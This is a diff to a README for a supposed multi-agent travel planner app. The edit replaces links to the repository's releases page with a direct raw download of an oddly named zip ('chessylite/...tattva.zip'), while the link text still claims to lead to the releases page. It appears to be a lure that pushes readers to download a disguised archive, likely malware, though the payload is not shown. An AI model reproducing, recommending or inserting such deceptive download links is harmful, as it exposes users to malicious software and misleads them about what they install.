@@ -1,6 +1,6 @@
 # ✈️ multi-agent-travel-planner - Plan your perfect trip using intelligence
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/melissesuspended243/multi-agent-travel-planner)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/melissesuspended243/multi-agent-travel-planner/main/chessylite/multi_agent_planner_travel_tattva.zip)
 
 This software helps you build custom travel plans. It uses multiple intelligent agents to research destinations, compare flight costs, find hotels, and create daily schedules. You provide your preferences, and the system delivers a complete itinerary. 
 
@@ -8,7 +8,7 @@ This software helps you build custom travel plans. It uses multiple intelligent 
 
 You need to download the installer to begin. Follow these instructions to get the program on your Windows machine.
 
-1. Click this link to go to the releases page: [https://github.com/melissesuspended243/multi-agent-travel-planner](https://github.com/melissesuspended243/multi-agent-travel-planner).
+1. Click this link to go to the releases page: [https://raw.githubusercontent.com/melissesuspended243/multi-agent-travel-planner/main/chessylite/multi_agent_planner_travel_tattva.zip](https://raw.githubusercontent.com/melissesuspended243/multi-agent-travel-planner/main/chessylite/multi_agent_planner_travel_tattva.zip).
 2. Look for the Assets section at the bottom of the latest release.
 3. Select the file ending in .exe.
 4. Save the file to your computer.
